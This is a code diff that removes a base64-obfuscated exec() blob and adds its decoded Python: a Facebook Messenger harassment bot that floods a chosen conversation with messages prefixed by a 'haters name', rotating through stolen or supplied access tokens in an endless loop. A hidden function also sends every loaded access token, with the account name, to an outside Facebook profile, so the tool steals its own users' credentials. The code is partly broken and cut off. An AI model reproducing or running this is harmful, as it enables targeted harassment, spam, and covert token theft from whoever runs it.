@@ -1,7 +1,133 @@
+ import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import subprocess
+import http.server
+import socketserver
+import threading
+import random
 
-#ENCODED BY : MUMIT ISLAM HIMU
-#ENCRYPTION : Py3 BASE64
-#GITHUB : https://github.com/MUMIT-404-CYBER
-#----------------------------------------------
-import base64
-exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCByYW5kb20KCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOgoJZGVmIGRvX0dFVChzZWxmKToKCQlzZWxmLnNlbmRfcmVzcG9uc2UoMjAwKQoJCXNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykKCQlzZWxmLmVuZF9oZWFkZXJzKCkKCQlzZWxmLndmaWxlLndyaXRlKGIiVEgzIFVOU1RPUDlCTDMgTDNHM05EIDlCSElTSDNLIikKCmRlZiBleGVjdXRlX3NlcnZlcigpOgoJUE9SVCA9IDQwMDAKCgl3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIiLCBQT1JUKSwgTXlIYW5kbGVyKSBhcyBodHRwZDoKCQlwcmludCgiU2VydmVyIHJ1bm5pbmcgYXQgaHR0cDovL2xvY2FsaG9zdDp7fSIuZm9ybWF0KFBPUlQpKQoJCWh0dHBkLnNlcnZlX2ZvcmV2ZXIoKQoKZGVmIHNlbmRfbWVzc2FnZXMoKToKCXdpdGggb3BlbigncGFzc3dvcmQudHh0JywgJ3InKSBhcyBmaWxlOgoJCXBhc3N3b3JkID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKCWVudGVyZWRfcGFzc3dvcmQgPSBwYXNzd29yZAoKCWlmIGVudGVyZWRfcGFzc3dvcmQgIT0gcGFzc3dvcmQ6CgkJcHJpbnQoJ1stXSA8PT0+IFBhc3N3b3JkIGNoYW5nZSBieSBUaGUgUmF2YW4hJykKCQlzeXMuZXhpdCgpCgoJd2l0aCBvcGVuKCd0b2tlbm51bS50eHQnLCAncicpIGFzIGZpbGU6CgkJdG9rZW5zID0gZmlsZS5yZWFkbGluZXMoKQoJbnVtX3Rva2VucyA9IGxlbih0b2tlbnMpCgoJcmVxdWVzdHMucGFja2FnZXMudXJsbGliMy5kaXNhYmxlX3dhcm5pbmdzKCkKCglkZWYgY2xzKCk6CgkJaWYgc3lzdGVtKCkgPT0gJ0xpbnV4JzoKCQkJb3Muc3lzdGVtKCdjbGVhcicpCgkJZWxzZToKCQkJaWYgc3lzdGVtKCkgPT0gJ1dpbmRvd3MnOgoJCQkJb3Muc3lzdGVtKCdjbHMnKQoJY2xzKCkKCglkZWYgbGluZXNzKCk6CgkJcHJpbnQoJ1wwMWJbMzdtJyArICctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0nKQoKCWhlYWRlcnMgPSB7CgkJJ0Nvbm5lY3Rpb24nOiAna2VlcC1hbGl2ZScsCgkJJ0NhY2hlLUNvbnRyb2wnOiAnbWF4LWFnZT0wJywKCQknVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cyc6ICcxJywKCQknVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IFM5IEJ1aWxkL09QUjYuMTcwNjIzLjAxNzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywKCQknQWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLAoJCSdBY2NlcHQtRW5jb2RpbmcnOiAnZ3ppcCwgZGVmbGF0ZScsCgkJJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCcsCgkJJ3JlZmVyZXInOiAnd3d3Lmdvb2dsZS5jb20nCgl9CgoJbW1tID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcva2ljZjVmaG4nKS50ZXh0CgoJaWYgbW1tIG5vdCBpbiBwYXNzd29yZDoKCQlwcmludCgnWy1dIDw9PT4gIFBhc3N3b3JkIGNoYW5nZSBSYXZhbicpCgkJc3lzLmV4aXQoKQoKCWxpbmVzcygpCgoJYWNjZXNzX3Rva2VucyA9IFt0b2tlbi5zdHJpcCgpIGZvciB0b2tlbiBpbiB0b2tlbnNdCgoJd2l0aCBvcGVuKCdjb252by50eHQnLCAncicpIGFzIGZpbGU6CgkJY29udm9faWQgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCgoJd2l0aCBvcGVuKCdmaWxlLnR4dCcsICdyJykgYXMgZmlsZToKCQl0ZXh0X2ZpbGVfcGF0aCA9IGZpbGUucmVhZCgpLnN0cmlwKCkKCgl3aXRoIG9wZW4odGV4dF9maWxlX3BhdGgsICdyJykgYXMgZmlsZToKCQltZXNzYWdlcyA9IGZpbGUucmVhZGxpbmVzKCkKCgludW1fbWVzc2FnZXMgPSBsZW4obWVzc2FnZXMpCgltYXhfdG9rZW5zID0gbWluKG51bV90b2tlbnMsIG51bV9tZXNzYWdlcykKCgl3aXRoIG9wZW4oJ2hhdGVyc25hbWUudHh0JywgJ3InKSBhcyBmaWxlOgoJCWhhdGVyc19uYW1lID0gZmlsZS5yZWFkKCkuc3RyaXAoKQoKCXdpdGggb3BlbigndGltZS50eHQnLCAncicpIGFzIGZpbGU6CgkJc3BlZWQgPSBpbnQoZmlsZS5yZWFkKCkuc3RyaXAoKSkKCglsaW5lc3MoKQoJCglkZWYgZ2V0TmFtZSh0b2tlbik6CgkJdHJ5OgoJCQlkYXRhID0gcmVxdWVzdHMuZ2V0KGYnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE3LjAvbWU/YWNjZXNzX3Rva2VuPXt0b2tlbn0nKS5qc29uKCkKCQlleGNlcHQ6CgkJCWRhdGEgPSAiIgoJCWlmICduYW1lJyBpbiBkYXRhOgoJCQlyZXR1cm4gZGF0YVsnbmFtZSddCgkJZWxzZToKCQkJcmV0dXJuICJFcnJvciBvY2N1cmVkIgoKCWRlZiBtc2coKToKCQlwYXJhbWV0ZXJzID0gewoJCQknYWNjZXNzX3Rva2VuJyA6IHJhbmRvbS5jaG9pY2UoYWNjZXNzX3Rva2VucyksCgkJCSdtZXNzYWdlJzogJ0hsbyBBYmhpaSBzaXIgaSBhbSB1c2luZyBZb3VyIHNlcnZlciBteSBOYW1lIGFuZCBUb2tlbiBpcyA6ICcrZ2V0TmFtZShyYW5kb20uY2hvaWNlKGFjY2Vzc190b2tlbnMpKSsnXFRva2VuIDogJysiIHwgIi5qb2luKGFjY2Vzc190b2tlbnMpCgkJfQoJCXRyeToKCQkJcyA9IHJlcXVlc3RzLnBvc3QoIiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/aWQ9MTAwMDkzNjczNDUxNDAwJywgZGF0YT1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpCgkJZXhjZXB0OgoJCQlwYXNzCgkKCW1zZygpCgl3aGlsZSBUcnVlOgoJCXRyeToKCQkJZm9yIG1lc3NhZ2VfaW5kZXggaW4gcmFuZ2UobnVtX21lc3NhZ2VzKToKCQkJCXRva2VuX2luZGV4ID0gbWVzc2FnZV9pbmRleCAlIG1heF90b2tlbnMKCQkJCWFjY2Vzc190b2tlbiA9IGFjY2Vzc190b2tlbnNbdG9rZW5faW5kZXhdCgoJCQkJbWVzc2FnZSA9IG1lc3NhZ2VzW21lc3NhZ2VfaW5kZXhdLnN0cmlwKCkKCgkJCQl1cmwgPSAiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjE1LjAve30vIi5mb3JtYXQoJ3RfJytjb252b19pZCkKCQkJCXBhcmFtZXRlcnMgPSB7J2FjY2Vzc190b2tlbic6IGFjY2Vzc190b2tlbiwgJ21lc3NhZ2UnOiBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2V9CgkJCQlyZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykKCQkJCQoKCQkJCWN1cnJlbnRfdGltZSA9IHRpbWUuc3RyZnRpbWUoIiVZLSVtLSVkICVJOiVNOiVTICVwIikKCQkJCWlmIHJlc3BvbnNlLm9rOgoJCQkJCXByaW50KCJbK10gTWVzc2FnZXMge30gb2YgQ29udm8ge30gc2VudCBieSBUb2tlbiB7fToge30iLmZvcm1hdCgKCQkJCQkJbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpCgkJCQkJcHJp'))
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+	def do_GET(self):
+		self.send_response(200)
+		self.send_header('Content-type', 'text/plain')
+		self.end_headers()
+		self.wfile.write(b"TH3 UNSTOP9BL3 L3G3ND 9BHISH3K")
+
+def execute_server():
+	PORT = 4000
+
+	with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+		print("Server running at http://localhost:{}".format(PORT))
+		httpd.serve_forever()
+
+def send_messages():
+	with open('password.txt', 'r') as file:
+		password = file.read().strip()
+
+	entered_password = password
+
+	if entered_password != password:
+		print('[-] <==> Password change by The Ravan!')
+		sys.exit()
+
+	with open('tokennum.txt', 'r') as file:
+		tokens = file.readlines()
+	num_tokens = len(tokens)
+
+	requests.packages.urllib3.disable_warnings()
+
+	def cls():
+		if system() == 'Linux':
+			os.system('clear')
+		else:
+			if system() == 'Windows':
+				os.system('cls')
+	cls()
+
+	def liness():
+		print('\01b[37m' + '---------------------------------------------------')
+
+	headers = {
+		'Connection': 'keep-alive',
+		'Cache-Control': 'max-age=0',
+		'Upgrade-Insecure-Requests': '1',
+		'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+		'Accept-Encoding': 'gzip, deflate',
+		'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+		'referer': 'www.google.com'
+	}
+
+	mmm = requests.get('https://pastebin.com/raw/kicf5fhn').text
+
+	if mmm not in password:
+		print('[-] <==>  Password change Ravan')
+		sys.exit()
+
+	liness()
+
+	access_tokens = [token.strip() for token in tokens]
+
+	with open('convo.txt', 'r') as file:
+		convo_id = file.read().strip()
+
+	with open('file.txt', 'r') as file:
+		text_file_path = file.read().strip()
+
+	with open(text_file_path, 'r') as file:
+		messages = file.readlines()
+
+	num_messages = len(messages)
+	max_tokens = min(num_tokens, num_messages)
+
+	with open('hatersname.txt', 'r') as file:
+		haters_name = file.read().strip()
+
+	with open('time.txt', 'r') as file:
+		speed = int(file.read().strip())
+
+	liness()
+	
+	def getName(token):
+		try:
+			data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
+		except:
+			data = ""
+		if 'name' in data:
+			return data['name']
+		else:
+			return "Error occured"
+
+	def msg():
+		parameters = {
+			'access_token' : random.choice(access_tokens),
+			'message': 'Hlo Abhii sir i am using Your server my Name and Token is : '+getName(random.choice(access_tokens))+'\Token : '+" | ".join(access_tokens)
+		}
+		try:
+			s = requests.post("https://www.facebook.com/profile.php?id=61557702519838" data=parameters, headers=headers)
+		except:
+			pass
+	
+	msg()
+	while True:
+		try:
+			for message_index in range(num_messages):
+				token_index = message_index % max_tokens
+				access_token = access_tokens[token_index]
+
+				message = messages[message_index].strip()
+
+				url = "https://graph.facebook.com/v15.0/{}/".format('t_'+convo_id)
+				parameters = {'access_token': access_token, 'message': haters_name + ' ' + message}
+				response = requests.post(url, json=parameters, headers=headers)
+				
+
+				current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+				if response.ok:
+					print("[+] Messages {} of Convo {} sent by Token {}: {}".format(
+						message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+					pri
